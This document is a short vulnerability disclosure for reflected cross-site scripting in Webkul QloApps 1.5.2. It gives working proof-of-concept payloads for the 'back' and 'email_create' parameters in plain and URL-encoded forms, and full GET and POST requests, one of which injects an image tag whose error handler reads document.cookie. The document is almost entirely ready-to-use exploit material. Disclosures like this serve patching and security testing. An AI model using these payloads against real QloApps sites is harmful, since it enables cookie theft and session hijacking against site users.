# Webkul Qloapps 1.5.2 - Cross-Site Scripting (XSS)
Webkul QloApps 1.5.2: Vulnerable to XSS on two Parameter (email_create and back)

## Exploit - Proof of Concept (POC)

### XXS: 'back' Parameter
```
Payload (Parameter back – Plain text): 
[xss onfocus=alert(1) autofocus= xss] 

Payload (Parameter back – URL Encoded): 
[xss%20onfocus%3dalert(1)%20autofocus%3d%20xss]

Full GET Request (Parameter back): 
[http://localhost/hotelcommerce-1.5.2/?rand=1679996611398&controller=authentication&SubmitCreate=1&ajax=true&email_create=a&back=xss%20onfocus%3dalert(1)%20autofocus%3d%20xss&token=6c62b773f1b284ac4743871b300a0c4d]
```

![image info](./back-parameter-xss.png)


### XXS: 'email_create' Parameter
```
Payload (Parameter email_create – Plain text): 
[xss><img src=a onerror=alert(document.cookie)>xss] 

Payload (Parameter email_create – URL Encoded): 
[xss%3e%3cimg%20src%3da%20onerror%3dalert(document.cookie)%3exss]

POST Request (Parameter email_create) (POST REQUEST DATA ONLY): 
[controller=authentication&SubmitCreate=1&ajax=true&email_create=xss%3e%3cimg%20src%3da%20onerror%3dalert(document.cookie)%3exss&back=my-account&token=6c62b773f1b284ac4743871b300a0c4d]
```

![image info](./email_create-parameter-xss.png)


Confirmed on: 30 March 2023 

Vendor: QloApps [https://github.com/webkul/hotelcommerce]
